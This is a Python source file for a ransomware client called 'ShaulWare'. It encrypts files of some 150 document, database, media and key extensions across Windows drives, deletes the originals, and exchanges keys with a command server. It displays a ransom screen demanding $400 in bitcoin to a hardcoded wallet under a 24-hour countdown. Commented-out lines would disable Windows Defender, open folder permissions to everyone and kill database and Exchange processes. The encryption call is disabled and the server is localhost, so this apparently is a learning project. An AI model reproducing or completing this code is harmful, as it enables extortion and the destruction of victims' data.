from cryptography.fernet import Fernet
import os
import tkinter as tk
from socket import *
import rsa
import pickle
import ctypes
import win32con
from win32 import win32api
from tkinter import filedialog, Text
from datetime import datetime, timedelta
from threading import Thread


class Timer:
    def __init__(self, root, hours, minutes, seconds, clock):
        self.root = root
        self.hours = hours
        self.minutes = minutes
        self.seconds = seconds
        self.clock = clock
        self.clock.place(x=70, y=400)

    def start_clock(self):
        if self.hours == 0 and self.minutes == 0 and self.seconds == 1:
           # for r, d, f in os.walk():
           #     for file in f:
           #         if file.split(".")[-1] == "SHAOOLY":
           #             filepath = os.path.join(r, file)
           #             os.remove(filepath)
           #
            return  # Stop timer

        self.seconds -= 1
        if self.seconds == 00:
            self.minutes -= 1
            self.seconds = 60

        if self.minutes == 00 and self.seconds == 00:
            self.hours += 1

        self.clock.config(text=f'{self.hours:02}:{self.minutes:02}:{self.seconds:02}')
        self.root.after(1000, self.start_clock)  # Call again in 1 seconds (1000ms)


class Encrypt(Thread):

    def __init__(self, drive, key):
        self.drive = drive
        self.fernet = Fernet(key)
        self.accepted_extensions = [
                                    "Sxw",
                                    "stw",
                                    "uot",
                                    "3ds",
                                    "max",
                                    "3dm",
                                    "ods",
                                    "ots",
                                    "der",
                                    "pfx",
                                    "key",
                                    "crt",
                                    "csr",
                                    "p12",
                                    "pem",
                                    "odt",
                                    "ott",
                                    "sxc",
                                    "stc",
                                    "dif",
                                    "slk",
                                    "wb2",
                                    "odp",
                                    "otp",
                                    "sxd",
                                    "std",
                                    "uop",
                                    "odg",
                                    "otg",
                                    "sxm",
                                    "mml",
                                    "lay",
                                    "lay6",
                                    "asc",
                                    "sqlite3",
                                    "sqlitedb",
                                    "sql",
                                    "accdb",
                                    "mdb",
                                    "dbf",
                                    "odb",
                                    "frm",
                                    "myd",
                                    "myi",
                                    "ibd",
                                    "mdf",
                                    "ldf",
                                    "sln",
                                    "suo",
                                    "cpp",
                                    "pas",
                                    "asm",
                                    "cmd",
                                    "bat",
                                    "ps1",
                                    "vbs",
                                    "dip",
                                    "dch",
                                    "sch",
                                    "brd",
                                    "jsp",
                                    "php",
                                    "asp",
                                    "java",
                                    "jar",
                                    "class",
                                    "mp3",
                                    "wav",
                                    "swf",
                                    "fla",
                                    "wmv",
                                    "mpg",
                                    "vob",
                                    "mpeg",
                                    "asf",
                                    "avi",
                                    "mov",
                                    "mp4",
                                    "3gp",
                                    "mkv",
                                    "3g2",
                                    "flv",
                                    "wma",
                                    "mid",
                                    "m3u",
                                    "m4u",
                                    "djvu",
                                    "svg",
                                    "psd",
                                    "nef",
                                    "tiff",
                                    "tif",
                                    "cgm",
                                    "raw",
                                    "gif",
                                    "png",
                                    "bmp",
                                    "jpg",
                                    "jpeg",
                                    "vcd",
                                    "iso",
                                    "backup",
                                    "zip",
                                    "vmdk",
                                    "vdi",
                                    "sldm",
                                    "sldx",
                                    "sti",
                                    "sxi",
                                    "602",
                                    "hwp",
                                    "snt",
                                    "onetoc2",
                                    "dwg",
                                    "pdf",
                                    "wk1",
                                    "wks",
                                    "123",
                                    "rtf",
                                    "csv",
                                    "txt",
                                    "vsdx",
                                    "vsd",
                                    "edb",
                                    "eml",
                                    "msg",
                                    "ost",
                                    "pst",
                                    "potm",
                                    "potx",
                                    "ppam",
                                    "ppsx",
                                    "ppsm",
                                    "pps",
                                    "pot",
                                    "pptm",
                                    "pptx",
                                    "ppt",
                                    "xltm",
                                    "xltx",
                                    "xlc",
                                    "xlm",
                                    "xlt",
                                    "xlw",
                                    "xlsb",
                                    "xlsm",
                                    "xlsx",
                                    "xls",
                                    "dotx",
                                    "dotm",
                                    "dot",
                                    "docm",
                                    "docb",
                                    "docx",
                                    "doc",
                                    "rar",
                                    "tgz",
                                    "tar",
                                    "bak",
                                    "tbk",
                                    "bz2",
                                    "PAQ",
                                    "ARC",
                                    "aes",
                                    "gpg",
                                    "vmx",
                                    ]
        self.max_size = 1500000000

    def run(self):
        for r, d, f in os.walk(self.drive):
            if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
                for file in f:
                    if file.split(".")[-1] in self.accepted_extensions:
                        filepath = os.path.join(r, file)
                        if len(file.split('.')) == 1:
                            file_extension = ""
                        else:
                            file_extension = file.split(".")[-1]
                        file_name = file.split(".")[0]
                        enc_file_name = f'{r}/{file_name}.SHAOOLY'
                        if os.path.getsize(filepath) < self.max_size:
                            try:
                                with open(filepath, 'rb') as byte_file:
                                    enc_file_content = self.fernet.encrypt(byte_file.read())
                                    os.remove(filepath)
                                    with open(enc_file_name, 'x') as encrypted_file:
                                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                            except FileExistsError as _fileExists:
                                index = 0
                                while True:
                                    index += 1
                                    try:
                                        enc_file_name = f'{r}/{file_name}({index}).SHAOOLY'
                                        with open(enc_file_name, 'x') as encrypted_file:
                                            encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                                        break
                                    except FileExistsError as _fileExits:
                                        pass
                            except OSError as _OsError:
                                pass


class Decrypt(Thread):
    def __init__(self, drive, key):
        Thread.__init__(self)
        self.drive = drive
        self.fernet = Fernet(key)

    def run(self):
        print(f"Started denrypting drive {self.drive}")
        for r, d, f in os.walk(self.drive):
            for file in f:
                filepath = os.path.join(r, file)
                filename = filepath.split('/')[-1].split(".")[0]
                if filepath.split('/')[-1].split(".")[-1] == "SHAOOLY":
                    with open(filepath, 'r') as enc_file:
                        file_content = enc_file.read().split('\n')
                    ext = file_content[0]
                    file_name_with_ext = f'{filename}.{ext}'
                    try:
                        with open(file_name_with_ext, 'wb') as dec_file:
                            dec_file.write(self.fernet.decrypt(file_content[1].encode()))
                        os.remove(filepath)
                    except OSError as _osException:
                        pass


class RansomwareClient:
    def __init__(self):
        host = '127.0.0.1'
        port = 17694
        self.my_socket = socket()
        self.my_socket.connect((host, port))
        publickey, privatekey = rsa.newkeys(512)
        self.my_socket.send(pickle.dumps((publickey, gethostname())))
        received_key = pickle.loads(self.my_socket.recv(1024))
        symmetric_key = rsa.decrypt(received_key, privatekey)
        self.fernet = Fernet(symmetric_key)

    def check_payment(self, transaction_id):
        self.my_socket.send(self.fernet.encrypt(transaction_id.encode()))
        print("sent the api request")
        answer = pickle.loads(self.fernet.decrypt(self.my_socket.recv(1024)))  # CODES:
        if type(answer) is bool:
            return answer
        return False

    def get_key(self):
        self.my_socket.send(self.fernet.encrypt("sendkey".encode()))
        return self.fernet.decrypt(self.my_socket.recv(1024))


class Interface:
    def __init__(self, client):
        self.root = tk.Tk()
        self.root.title('ShaulWare Decrypt')
        self.root.resizable(False, False)
        self.canvas = tk.Canvas(self.root, height=800, width=1250, bg="#841212")
        self.canvas.pack()
        self.canDecrypt = False
        self.text_list = []
        self.clock = tk.Label(self.root, height=1, background="#000000", foreground='white', font=("Lemon Milk", 20),
                              text="00:00:00")
        self.timer = Timer(root=self.root, hours=23, minutes=59, seconds=59, clock=self.clock)
        self.client = client
        self.client_transaction_id = Text(self.root, height=2, width=40)

    def disable_event(self):
        if self.canDecrypt:
            self.root.destroy()

    def decryption_start(self):
        if self.canDecrypt:
            # drives = win32api.GetLogicalDriveStrings()
            # drives = drives.split('\000')[:-1]
            # for drive in drives:
            #     Decrypt(drive).start()
            self.canvas['background'] = '#558c0d'
            self.canvas.delete('all')
            self.clock.destroy()
            self.canvas.create_image(125, 140, image=tk.PhotoImage(file="green.png"))
            for textbox in self.text_list:
                textbox.destroy()

    def check_payment(self):
        transaction_id = self.client_transaction_id.get("1.0", tk.END + "-1c")
        self.canDecrypt = self.client.check_payment(transaction_id)
        self.decryption_start()

    def copy_address(self):
        r = tk.Tk()
        r.withdraw()
        r.clipboard_clear()
        r.clipboard_append("37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv")
        r.destroy()

    def run(self):
        transaction_id_writing = tk.Label(self.root, text="Transaction id here:", height=2)
        transaction_id_writing.place(x=430, y=760)
        self.text_list.append(transaction_id_writing)

        # BITCOIN WALLET
        my_wallet_id = tk.Label(self.root, text="BITCOIN ADDRESS: 37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv", height=2)
        my_wallet_id.place(x=835, y=570)
        self.text_list.append(my_wallet_id)

        # VICTIM'S TRANSACTION ID
        self.client_transaction_id.place(x=550, y=760)
        self.text_list.append(self.client_transaction_id)

        # LOST FILES
        currentTimeDate = datetime.now() + timedelta(days=1)
        currentTime = currentTimeDate.strftime('%Y-%m-%d %H:%M')
        lost_files = tk.Label(self.root, text=f"Your files will be lost on \n{currentTime}\n\n Time Left:", fg='yellow',
                              bg='#841212'
                              , font=("Arial", 15))
        lost_files.place(x=20, y=280)
        self.text_list.append(lost_files)

        # INFO BOX

        with open(r'ransomnote.txt', 'r') as ransomnote_file:
            ransomnote = ransomnote_file.read()
        info = tk.Label(self.root, text=ransomnote, bg='white', fg='black', height=30, width=78, justify='left', anchor='nw',
                        font=("Arial", 12))
        info.place(x=540, y=10)
        self.text_list.append(info)

        # SEND MONEY
        send_money = tk.Label(self.root, text="-------->\nSend 400$\n worth of bitcoin\n to this address", height=11,
                              width=15,
                              anchor='n')
        send_money.place(x=720, y=570)
        self.text_list.append(send_money)
        # --------- BUTTONS ------------
        # A BUTTON TO CHECK PAYMENT
        CheckPayment = tk.Button(self.root, text="Check Payment", fg="black", bg="white", padx=130, pady=5,
                                 command=self.check_payment)
        CheckPayment.place(x=900, y=760)
        self.text_list.append(CheckPayment)

        # A BUTTON TO COPY THE ADDRESS TO CLIPBOARD
        CopyAddress = tk.Button(self.root, text="Copy", fg="black", bg="white", padx=25, pady=5, command=self.copy_address)
        CopyAddress.place(x=1160, y=570)
        self.text_list.append(CopyAddress)

        # --------- IMAGES ------------
        # BITCOIN ACCEPTED HERE SIGN
        bitcoin_accepted_here = tk.PhotoImage(file="bitcoin.png")
        self.canvas.create_image(1040, 680, image=bitcoin_accepted_here)

        # QR CODE
        qr_code = tk.PhotoImage(file="QR.PNG")
        self.canvas.create_image(627, 660, image=qr_code)

        # RED LOCK

        red_lock = tk.PhotoImage(file="red.png")
        self.canvas.create_image(125, 140, image=red_lock)

        # YOK
        yok = tk.PhotoImage(file="yok.png")
        self.canvas.create_image(400, 180, image=yok)

        # YOK2
        yok2 = tk.PhotoImage(file="yok2.png")
        self.canvas.create_image(400, 540, image=yok2)

        self.timer.start_clock()
        self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
        self.root.mainloop()


def set_wallpaper(path):
    changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE
    ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER, 0, path.encode(), changed)


if __name__ == "__main__":  # and 1 == 2:  # I added the 1 == 2 just as a security measure for now
    # os.system("sc stop WinDefend")
    # os.system("attrib +h .")
    # os.system("icacls . /grant Everyone:F /T /C /Q")
    # os.system("taskkill.exe /f /im mysqld.exe")
    # os.system("taskkill.exe /f /im sqlwriter.exe")
    # os.system("taskkill.exe /f /im sqlserver.exe")
    # os.system("taskkill.exe /f /im MSExchange*")
    # os.system("taskkill.exe /f /im Microsoft.Exchange.*")
    client = RansomwareClient()
    SYMMETRIC_KEY = client.get_key()
    #    drives = win32api.GetLogicalDriveStrings()
    #    drives = drives.split('\000')[:-1]
    #    for drive in drives:
    #        pass
    #        # Encrypt(drive).start()
    my_interface = Interface(client)
    my_interface.run() # NOTE: The interface will be started last.

    # c = RansomwareClient()
    # key = c.get_key()# TO DO: make sure connecting to the machine.


    # change the wallpaper to scare the user.
    # setWallpaper("computer_background.jpeg")
#

